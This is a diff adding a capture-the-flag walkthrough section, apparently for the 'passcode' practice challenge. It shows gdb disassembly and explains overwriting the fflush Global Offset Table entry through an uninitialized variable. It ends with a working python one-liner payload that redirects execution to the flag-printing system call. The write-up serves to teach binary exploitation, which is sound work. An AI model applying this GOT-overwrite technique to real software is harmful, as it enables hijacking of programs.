@@ -181,6 +181,119 @@ End of assembler dump.
 ```
 we see a comment of the string, then we run x/s *0x6c2070 to see the string in that address.
 
+### Level 5 - Passcode
+
+first of all, I highly recommend you guys to sit and try to do the challenge yourself, because I think its really good.
+
+This time, we have a simple c program which asks the user for a name, 2 numbers, and checks if the numbers are equal to some numbers.
+Lets try to disassemble the `welcome` function:
+
+```assembly
+Dump of assembler code for function welcome:
+   0x08048609 <+0>:     push   ebp
+   0x0804860a <+1>:     mov    ebp,esp
+   0x0804860c <+3>:     sub    esp,0x88
+   0x08048612 <+9>:     mov    eax,gs:0x14
+   0x08048618 <+15>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0804861b <+18>:    xor    eax,eax
+   0x0804861d <+20>:    mov    eax,0x80487cb
+   0x08048622 <+25>:    mov    DWORD PTR [esp],eax
+   0x08048625 <+28>:    call   0x8048420 <printf@plt>
+   0x0804862a <+33>:    mov    eax,0x80487dd
+   0x0804862f <+38>:    lea    edx,[ebp-0x70]
+   0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048636 <+45>:    mov    DWORD PTR [esp],eax
+   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x0804863e <+53>:    mov    eax,0x80487e3
+   0x08048643 <+58>:    lea    edx,[ebp-0x70]
+   0x08048646 <+61>:    mov    DWORD PTR [esp+0x4],edx
+   0x0804864a <+65>:    mov    DWORD PTR [esp],eax
+   0x0804864d <+68>:    call   0x8048420 <printf@plt>
+   0x08048652 <+73>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048655 <+76>:    xor    eax,DWORD PTR gs:0x14
+   0x0804865c <+83>:    je     0x8048663 <welcome+90>
+   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
+   0x08048663 <+90>:    leave  
+   0x08048664 <+91>:    ret    
+End of assembler dump.
+```
+
+this function will ask the user for a string of length 100. the most important thing its to notice that the string is located in `ebp - 0x70`, so lets keep that in mind.
+now lets disassemble the `login` function:
+
+```assembly
+Dump of assembler code for function login:
+   0x08048564 <+0>:     push   ebp
+   0x08048565 <+1>:     mov    ebp,esp
+   0x08048567 <+3>:     sub    esp,0x28
+   0x0804856a <+6>:     mov    eax,0x8048770
+   0x0804856f <+11>:    mov    DWORD PTR [esp],eax
+   0x08048572 <+14>:    call   0x8048420 <printf@plt>
+   0x08048577 <+19>:    mov    eax,0x8048783
+   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
+   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
+   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x0804858b <+39>:    mov    eax,ds:0x804a02c
+   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
+   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
+   0x08048598 <+52>:    mov    eax,0x8048786
+   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
+   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
+   0x080485a5 <+65>:    mov    eax,0x8048783
+   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
+   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
+   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
+   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
+   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
+   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
+   0x080485cc <+104>:   jne    0x80485f1 <login+141>
+   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
+   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
+   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
+   0x080485de <+122>:   call   0x8048450 <puts@plt>
+   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
+   0x080485ea <+134>:   call   0x8048460 <system@plt>
+   0x080485ef <+139>:   leave  
+   0x080485f0 <+140>:   ret    
+   0x080485f1 <+141>:   mov    DWORD PTR [esp],0x80487bd
+   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
+   0x080485fd <+153>:   mov    DWORD PTR [esp],0x0
+   0x08048604 <+160>:   call   0x8048480 <exit@plt>
+End of assembler dump.
+```
+We can see that `passcode1` is located in `ebp - 0x10`, and `passcode2` in `ebp - 0xc`.
+So the memory will look something like that:
+![image](https://user-images.githubusercontent.com/56035342/209885145-5571d145-f628-4b3a-a802-a3d4ed536e01.png)
+so we can change the value of passcode1 even inside the `welcome` function!
+now lets try to understand what the `login` function does.
+First of all, the program will ask the user for input, but it will write it to the value of passcode1.
+And right after that we have a `fflush` library call.
+Lets use gdb to see the address of `fflush`:
+```assembly
+(gdb) disassemble fflush
+Dump of assembler code for function fflush@plt:
+   0x08048430 <+0>:     jmp    DWORD PTR ds:0x804a004
+   0x08048436 <+6>:     push   0x8
+   0x0804843b <+11>:    jmp    0x8048410
+End of assembler dump.
+```
+We found the address 0x804a004, which is an address in the Global Offset Table, which calls the libc fflush function.
+If we can set the value of `passcode1` to `0x804a004`, we can write change the address in the Global Offset Table, so that we can run our own code!
+In order to change the value of `passcode1` , we would need to do:
+`(python -c "print('A' * 96 + '\x04\xa0\x04\x08')") | ./passcode`
+
+After that, we will reach the scanf of `passcode1`, which will write an input from the user into 0x804a004.
+So now we can control where the program will jump to!
+So in order to get the flag, the best thing to do is to jump to the end where the `system("/bin/cat flag");` starts.
+it starts right in this line:
+`0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af`
+but because scanf takes input in decimal, we would need to change 0x080485e3 to decimal, which is 134514147.
+So the final solution will be:
+`(python -c "print('A' * 96 + '\x04\xa0\x04\x08' + '134514147')") | ./passcode`
+
+
 ### Level 6 - Random
 
 We have a c file, which generates a random number, xors it with our input, and checks if it equals to 0xdeadbeef.
